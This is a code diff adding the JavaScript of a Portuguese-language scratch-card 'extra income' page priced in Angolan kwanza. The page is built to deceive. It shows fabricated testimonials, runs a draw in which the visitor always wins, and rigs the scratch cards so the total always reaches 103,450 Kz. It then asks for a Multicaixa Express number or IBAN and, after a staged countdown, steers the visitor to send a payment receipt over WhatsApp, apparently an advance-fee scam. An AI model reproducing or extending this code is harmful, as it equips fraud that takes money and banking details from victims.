+  {n:'Carlos M.',c:'#39d353',t:'Há 19h',l:241,tx:'Já fiz o meu saque. Plataforma séria 🔥'},
+  {n:'Paula T.',c:'#9b5de5',t:'Há 43h',l:32,tx:'Recebi o pagamento rápido. Recomendo muito!'},
+];
+(function() {
+  var c = document.getElementById('lcmts');
+  for (var i = 0; i < LC.length; i++) {
+    var cm = LC[i];
+    var ini = (cm.n.split(' ')[0][0] + (cm.n.split(' ')[1]||' ')[0]).toUpperCase();
+    var el = document.createElement('div');
+    el.className = 'lcc';
+    el.innerHTML = '<div class="lav" style="background:' + cm.c + '">' + ini + '</div>' +
+      '<div style="flex:1;font-size:.78rem;color:#ccc;"><span style="font-size:.8rem;font-weight:700;color:#fff;">' + cm.n + '</span> ' +
+      '<span style="font-size:.68rem;color:#666;">' + cm.t + '</span><br>' + cm.tx + '<br>' +
+      '<button style="font-size:.7rem;color:#888;cursor:pointer;background:none;border:none;margin-top:.3rem;">👍 ' + cm.l + '</button></div>';
+    c.appendChild(el);
+  }
+})();
+
+function playVid() {
+  document.getElementById('vph').style.display = 'none';
+}
+
+// ─── RENDA EXTRA COMMENTS ─────────────────────────────
+var PC = [
+  {h:'@maria_f',t:'Há 2 min',m:'Ainda estou emocionada 🙏 Raspei, ganhei e recebi os 100.000 KZ!'},
+  {h:'@joao_k',t:'Há 5 min',m:'Pensei que fosse conversa mas funcionou certinho.'},
+  {h:'@ana_p',t:'Há 12 min',m:'Em poucos minutos raspei e levantei o valor 👏'},
+  {h:'@carlos_m',t:'Há 45 min',m:'Raspei, ganhei e já levantei. É real!'},
+  {h:'@helena_s',t:'Há 1h',m:'Tudo claro sem complicação. Recebi no mesmo dia.'},
+  {h:'@paulo_t',t:'Há 2h',m:'Recomendo 🙌 O prémio sai de verdade.'},
+  {h:'@rosa_l',t:'Há 3h',m:'Raspei, ganhei e recebi. Aproveitem!'},
+  {h:'@fernando_a',t:'Há 5h',m:'Fui pago sem problemas. Fácil e confiável.'},
+];
+(function() {
+  var c = document.getElementById('pkcmts');
+  for (var i = 0; i < PC.length; i++) {
+    var cm = PC[i];
+    var el = document.createElement('div');
+    el.className = 'pcmt';
+    el.innerHTML = '<span style="font-size:.82rem;font-weight:700;color:#39ff14;">' + cm.h + '</span>' +
+      '<span style="font-size:.68rem;color:#555;margin-left:.4rem;">' + cm.t + '</span>' +
+      '<div style="font-size:.8rem;color:#bbb;margin:.2rem 0 .3rem;line-height:1.45;">' + cm.m + '</div>' +
+      '<button style="font-size:.72rem;color:#555;cursor:pointer;background:none;border:none;">👍</button> ' +
+      '<button style="font-size:.72rem;color:#555;cursor:pointer;background:none;border:none;">Responder</button>';
+    c.appendChild(el);
+  }
+})();
+
+function doSorteio() {
+  var n = document.getElementById('pname').value.trim();
+  if (!n) { alert('Por favor insira o seu nome!'); return; }
+  G.name = n;
+  document.getElementById('coName').value = n;
+  document.getElementById('coRefInp').value = REF;
+  document.getElementById('coRef').textContent = REF.replace(/(\d{3})(\d{3})(\d{3})/, '$1 $2 $3');
+  ir('p3');
+  runDrum(n);
+}
+
+// ─── SORTEIO ────────────────────────────────────────
+var FN = ['Ana Lima','Carlos P.','José M.','Fatima K.','Bruno S.','Maria T.','Pedro N.','Lucia R.'];
+function runDrum(winner) {
+  var d = document.getElementById('ddisp');
+  var w = document.getElementById('dwin');
+  var s = document.getElementById('dsub');
+  var t = 0;
+  var iv = setInterval(function() {
+    t++;
+    d.textContent = t > 37 ? winner : FN[Math.floor(Math.random() * FN.length)];
+    d.style.color = t > 37 ? '#FFD700' : '#aaa';
+    if (t >= 42) {
+      clearInterval(iv);
+      d.style.display = 'none';
+      w.textContent = '🎉 ' + winner + '!'; w.style.display = 'block';
+      s.textContent = 'PARABÉNS! Foi sorteado(a)!'; s.style.color = '#39ff14';
+      confetti();
+      setTimeout(function() {
+        document.getElementById('spb').style.display = 'block';
+        setTimeout(function() { document.getElementById('snxt').style.display = 'block'; }, 700);
+      }, 500);
+    }
+  }, 80);
+}
+
+// ─── START GAME ─────────────────────────────────────
+function startJogo(type, invest) {
+  // Setup
+  G.type = type;
+  G.invest = invest;
+  G.balance = 5000 - invest;
+  G.done = 0; G.wins = 0; G.totalWon = 0;
+  G.isWin = []; G.prizes = [];
+
+  // 4 random losing positions out of 10
+  var all = [0,1,2,3,4,5,6,7,8,9];
+  // shuffle
+  for (var i = all.length - 1; i > 0; i--) {
+    var j = Math.floor(Math.random() * (i + 1));
+    var tmp = all[i]; all[i] = all[j]; all[j] = tmp;
+  }
+  var losers = [all[0], all[1], all[2], all[3]];
+
+  var pi = 0;
+  for (var k = 0; k < 10; k++) {
+    var win = losers.indexOf(k) === -1;
+    G.isWin.push(win);
+    G.prizes.push(win ? (PRIZE_LIST[pi++] || 16000) : 0);
+  }
+
+  // Game header
+  var icons = {mini:'🎰', baza:'🃏', super:'🔥'};
+  var names = {mini:'Mini Baza', baza:'Baza', super:'Super Baza'};
+  document.getElementById('rIcon').textContent = icons[type];
+  document.getElementById('rName').textContent = names[type];
+
+  // Reset button
+  var bl = document.getElementById('blev');
+  bl.className = 'blev';
+  bl.textContent = '💰 Complete todas as raspadinhas para levantar';
+
+  // Build cells
+  buildGrid();
+  updateHUD();
+
+  // GO TO GAME
+  ir('p5');
+}
+
+// ─── BUILD GRID ─────────────────────────────────────
+function buildGrid() {
+  var grid = document.getElementById('sgrid');
+  grid.innerHTML = '';
+
+  for (var i = 0; i < 10; i++) {
+    var win = G.isWin[i];
+    var prize = G.prizes[i];
+    var sym = win ? WSYM[Math.floor(Math.random() * WSYM.length)] : LSYM[Math.floor(Math.random() * LSYM.length)];
+
+    var cell = document.createElement('div');
+    cell.className = 'scell';
+    if (i === 9) cell.style.gridColumn = '2';
+
+    var back = document.createElement('div');
+    back.className = 'scback';
+    back.innerHTML = '<div class="sem">' + sym + '</div>' +
+      '<div class="sv ' + (win ? 'g' : 'r') + '">' + (win ? prize.toLocaleString('pt-AO') + ' Kz' : '0 Kz') + '</div>';
+
+    var cv = document.createElement('canvas');
+    cv.width = 300; cv.height = 300;
+    drawTex(cv);
+
+    cell.appendChild(back);
+    cell.appendChild(cv);
+    grid.appendChild(cell);
+
+    // attach scratch — use IIFE to capture variables
+    (function(canvas, bk, idx, isW, pr) {
+      makeScratch(canvas, bk, idx, isW, pr);
+    })(cv, back, i, win, prize);
+  }
+}
+
+// ─── DRAW ORANGE TEXTURE ────────────────────────────
+function drawTex(cv) {
+  var W = 300, H = 300;
+  var ctx = cv.getContext('2d');
+  var g = ctx.createRadialGradient(W*.38, H*.32, 4, W/2, H/2, W*.75);
+  g.addColorStop(0, '#FFA020');
+  g.addColorStop(0.45, '#DF6E00');
+  g.addColorStop(1, '#B85500');
+  ctx.fillStyle = g;
+  ctx.fillRect(0, 0, W, H);
+  ctx.fillStyle = 'rgba(80,25,0,.42)';
+  for (var i = 0; i < 550; i++) {
+    ctx.beginPath();
+    ctx.arc(Math.random()*W, Math.random()*H, Math.random()*3.5+0.3, 0, 6.28);
+    ctx.fill();
+  }
+  ctx.fillStyle = 'rgba(255,175,50,.2)';
+  for (var j = 0; j < 200; j++) {
+    ctx.beginPath();
+    ctx.arc(Math.random()*W, Math.random()*H, Math.random()*2.5+0.3, 0, 6.28);
+    ctx.fill();
+  }
+  var sh = ctx.createLinearGradient(0, 0, W, H*0.5);
+  sh.addColorStop(0, 'rgba(255,195,70,.15)');
+  sh.addColorStop(1, 'rgba(0,0,0,0)');
+  ctx.fillStyle = sh;
+  ctx.fillRect(0, 0, W, H);
+}
+
+// ─── SCRATCH MECHANIC ───────────────────────────────
+function makeScratch(cv, back, idx, isWin, prize) {
+  var BRUSH = 32;
+  var THRESH = 0.52;
+  var painting = false;
+  var done = false;
+
+  function getXY(e) {
+    var r = cv.getBoundingClientRect();
+    var src = e.touches ? e.touches[0] : e;
+    return {
+      x: (src.clientX - r.left) * (cv.width / r.width),
+      y: (src.clientY - r.top) * (cv.height / r.height)
+    };
+  }
+
+  function erase(x, y) {
+    if (done) return;
+    var ctx = cv.getContext('2d');
+    ctx.globalCompositeOperation = 'destination-out';
+    ctx.beginPath();
+    ctx.arc(x, y, BRUSH, 0, 6.28);
+    ctx.fillStyle = 'rgba(0,0,0,1)';
+    ctx.fill();
+    checkThresh();
+  }
+
+  function checkThresh() {
+    if (done) return;
+    var ctx = cv.getContext('2d');
+    var px = ctx.getImageData(0, 0, cv.width, cv.height).data;
+    var tr = 0;
+    for (var i = 3; i < px.length; i += 4) {
+      if (px[i] < 128) tr++;
+    }
+    if (tr / (cv.width * cv.height) >= THRESH) {
+      done = true;
+      onReveal();
+    }
+  }
+
+  function onReveal() {
+    cv.style.opacity = '0';
+    cv.style.pointerEvents = 'none';
+    back.className = 'scback ' + (isWin ? 'win' : 'lose');
+    G.done++;
+    if (isWin) {
+      G.wins++;
+      G.totalWon += prize;
+      if (G.wins === 6) {
+        var diff = 103450 - G.totalWon;
+        if (diff > 0) G.totalWon += diff;
+      }
+      setTick('✨ +' + prize.toLocaleString('pt-AO') + ' Kz desbloqueados!');
+      confetti();
+    } else {
+      setTick('😔 Sem prémio nesta! Continue a raspar!');
+    }
+    updateHUD();
+    if (G.done === 10) setTimeout(endGame, 700);
+  }
+
+  cv.addEventListener('mousedown', function(e) {
+    e.preventDefault(); painting = true;
+    var p = getXY(e); erase(p.x, p.y);
+  });
+  cv.addEventListener('mousemove', function(e) {
+    if (!painting) return;
+    var p = getXY(e); erase(p.x, p.y);
+  });
+  cv.addEventListener('mouseup', function() { painting = false; });
+  cv.addEventListener('mouseleave', function() { painting = false; });
+  cv.addEventListener('touchstart', function(e) {
+    e.preventDefault(); painting = true;
+    var p = getXY(e); erase(p.x, p.y);
+  }, {passive: false});
+  cv.addEventListener('touchmove', function(e) {
+    e.preventDefault();
+    if (!painting) return;
+    var p = getXY(e); erase(p.x, p.y);
+  }, {passive: false});
+  cv.addEventListener('touchend', function(e) {
+    e.preventDefault(); painting = false;
+  }, {passive: false});
+}
+
+// ─── HUD ────────────────────────────────────────────
+function fmt(n) { return n.toLocaleString('pt-AO') + ' Kz'; }
+
+function updateHUD() {
+  document.getElementById('rnSaldo').textContent = fmt(G.balance + G.totalWon);
+  document.getElementById('rnDone').textContent = (G.done < 10 ? '0' : '') + G.done;
+  document.getElementById('stTot').textContent = fmt(G.totalWon);
+  document.getElementById('stDone').textContent = G.done + '/10';
+  document.getElementById('stWins').textContent = G.wins + '/10';
+}
+
+function setTick(m) { document.getElementById('tick').textContent = m; }
+
+function endGame() {
+  if (G.totalWon < 103450) G.totalWon = 103450;
+  G.finalTotal = G.totalWon;
+  document.getElementById('ltot').textContent = fmt(G.totalWon);
+  updateHUD();
+  setTick('🏆 Parabéns! Total: ' + fmt(G.totalWon) + ' — Clique em LEVANTAR!');
+  var bl = document.getElementById('blev');
+  bl.className = 'blev go';
+  bl.textContent = '💰 LEVANTAR ' + fmt(G.totalWon);
+  confetti(); confetti();
+}
+
+function goLev() {
+  if (document.getElementById('blev').className.indexOf('go') !== -1) ir('p6');
+}
+
+// ─── LEVANTAR ───────────────────────────────────────
+var selM = '';
+function pickM(m) {
+  selM = m;
+  document.getElementById('mbE').className = 'mb' + (m === 'express' ? ' on' : '');
+  document.getElementById('mbB').className = 'mb' + (m === 'banco' ? ' on' : '');
+  document.getElementById('iE').className = 'ib' + (m === 'express' ? ' show' : '');
+  document.getElementById('iB').className = 'ib' + (m === 'banco' ? ' show' : '');
+}
+function doSacar() {
+  if (!selM) { alert('Escolha o método de levantamento!'); return; }
+  if (selM === 'express' && !document.getElementById('inpE').value.trim()) { alert('Insira o número Multicaixa Express!'); return; }
+  if (selM === 'banco' && !document.getElementById('inpI').value.trim()) { alert('Insira o IBAN!'); return; }
+  ir('p7');
+  setTimeout(function() { ir('p8'); startCD(); }, 3200);
+}
+
+// ─── COUNTDOWN 3m35s ────────────────────────────────
+function startCD() {
+  var TOTAL = 215, left = TOTAL;
+  var fill = document.getElementById('cdfil');
+  var tel = document.getElementById('cdtime');
+  var btn = document.getElementById('bpag');
+  btn.disabled = true; fill.style.width = '0%';
+  var iv = setInterval(function() {
+    left--;
+    var m = Math.floor(left / 60), s = left % 60;
+    tel.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+    fill.style.width = ((TOTAL - left) / TOTAL * 100).toFixed(2) + '%';
+    if (left <= 0) {
+      clearInterval(iv);
+      btn.disabled = false;
+      document.getElementById('cdlbl').innerHTML = '<strong style="color:#39ff14">✅ Desbloqueado! Pode prosseguir.</strong>';
+    }
+  }, 1000);
+}
+
+// ─── WHATSAPP ───────────────────────────────────────
+function sendWA() {
+  var name = document.getElementById('coName').value.trim() || G.name;
+  var phone = document.getElementById('coPhone').value.trim();
+  var ref = document.getElementById('coRefInp').value.trim();
+  var msg = encodeURIComponent(
+    '🎰 *RASPADINHA RENDA EXTRA — COMPROVATIVO*\n\n' +
+    '👤 Nome: ' + name + '\n📱 Telefone: ' + phone + '\n' +
+    '🎮 Jogo: ' + G.type.toUpperCase() + '\n' +
+    '🔢 Referência: ' + ref + '\n💰 Valor: ' + fmt(G.finalTotal) + '\n\n' +
+    '📎 Segue em anexo o comprovativo de pagamento.'
+  );
+  window.open('https://wa.me/244923000000?text=' + msg, '_blank');
+}
+
+// ─── CONFETTI ───────────────────────────────────────
+function confetti() {
+  var cols = ['#FFD700','#39ff14','#FF6B6B','#4EC9C9','#FFA500','#FF69B4','#fff'];
+  for (var i = 0; i < 55; i++) {
+    var p = document.createElement('div');
+    p.className = 'cfp';
+    p.style.cssText = 'left:' + Math.random()*100 + 'vw;top:-15px;' +
+      'width:' + (Math.random()*8+5) + 'px;height:' + (Math.random()*12+7) + 'px;' +
+      'background:' + cols[Math.floor(Math.random()*cols.length)] + ';' +
+      'animation-duration:' + (1.4+Math.random()*2) + 's;' +
+      'animation-delay:' + (Math.random()*.5) + 's';
+    document.body.appendChild(p);
+    setTimeout(function() { if (p.parentNode) p.parentNode.removeChild(p); }, 3800);
+  }
+}
+</script>
+</body>
+</html>
